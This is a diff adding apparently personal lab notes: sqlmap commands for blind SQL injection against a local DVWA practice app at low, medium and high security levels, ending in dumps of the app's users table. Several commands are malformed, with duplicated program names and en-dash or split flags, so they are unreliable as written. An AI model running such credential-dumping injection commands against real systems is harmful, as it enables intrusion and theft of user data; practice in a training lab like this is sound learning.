@@ -1,0 +1,38 @@
+Get
+http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit
+PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3
+
+
+cd sqlmap
+python sqlmap.py
+	
+		Blind SQL injection Attack 	
+
+python sqlmap.py sqlmap -u "http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -cookie="PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3; security=low"
+
+python sqlmap.py sqlmap -u "http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -cookie="PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3; security=low" -- dbs
+
+python sqlmap.py sqlmap -u "http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -cookie="PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3; security=low" –D dvwa --tables
+
+python sqlmap -u "http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -cookie="PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3; security=low" –D dvwa -T users --columns
+
+python sqlmap.py sqlmap -u "http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -cookie="PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3; security=low" –D dvwa -T users --columns –D dvwa –T users --dump 
+
+ table 'dvwa.users' dumped to CSV file 'C:\Users\User\AppData\Local\sqlmap\output\localhost\dump\dvwa\users.csv'
+
+
+
+part 2
+Blind SQL Injection Attack at higher level of security
+
+Request URL: http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/
+Cookie: security=medium; PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3
+
+
+python sqlmap -u "http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/" -- data="id=1&Submit=Submit"
+--cookie="PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3; security=medium" –D dvwa –T users –-dump
+	
+		'C:\Users\User\AppData\Local\sqlmap\output\localhost\dump\dvwa\users.csv'
+		 C:\Users\User\AppData\Local\sqlmap\output\localhost'	
+
+python sqlmap.py sqlmap -u "http://localhost:8081/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="id=1; PHPSESSID=79tmlb5lrthctaep2q6vkg2lo3; security=high" -D dvwa -T users --dump --dbms=mysql --level=5 --risk=3 --time-sec=10
